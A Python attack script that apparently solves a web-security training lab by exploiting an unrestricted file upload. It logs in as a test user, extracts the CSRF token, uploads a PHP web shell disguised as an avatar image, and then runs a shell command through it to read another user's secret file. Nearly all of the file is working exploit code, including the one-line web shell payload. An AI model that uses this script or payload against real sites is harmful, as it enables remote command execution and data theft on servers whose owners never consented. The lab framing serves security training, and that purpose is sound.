import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import random, string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text,
        'html.parser')
    csrf = html.find(
        "input", {'name': 'csrf'})['value']
    return csrf

def is_login_successful(url, session):
    login_url = url + "/login"
    csrf_token = get_csrf_token(
        login_url, session)
    data_login = {
        "username": "wiener",
        "password": "peter",
        "csrf" : csrf_token
    }
    response = session.post(
        login_url,
        data=data_login,
        verify=False,
        proxies=proxies
    )
    return "Log out" in response.text

def is_upload_webshell_successful(url, session):
    account_url = url + "/my-account"
    csrf_token = get_csrf_token(account_url, session)
    avatar_url = account_url + "/avatar"
    params = {
        "avatar": (
            'webshell.php',
            "<?php system($_GET['cmd']);?>",
            'application/x-php'),
        "user" : "wiener",
        "csrf" : csrf_token
    }
    boundary = (
        '------WebKitFormBoundary'.join(
            random.sample(
            string.ascii_letters + string.digits, 16)))
    multi_part = MultipartEncoder(
        fields=params,
        boundary=boundary
    )
    headers = {
        'Content-Type': multi_part.content_type
    }
    response = session.post(
        avatar_url,
        data=multi_part,
        headers=headers,
        verify=False,
        proxies=proxies
    )
    return response.status_code == 200

def get_carlos_secret(url, session):
    cmd_url = (
        url + '/files/avatars/webshell.php?cmd=' + 
        'cat /home/carlos/secret')
    response = session.get(
        cmd_url,
        verify=False,
        proxies=proxies
    )
    if (response.status_code == 200):
        secret = response.text
        return secret
    raise ValueError("Could not get secret")

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting File Upload attack...")
        if not is_login_successful(url, session):
            print("[-] Login was not successful")
            sys.exit(FAIL)
        if not is_upload_webshell_successful(url, session):
            print("[-] Upload of webshell was not sucessful.")
            sys.exit(FAIL)
        secret = get_carlos_secret(url, session)
        print("[+] Carlos' secret is '%s'" % secret)
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The File Upload attack was not successful.")
        sys.exit(FAIL) 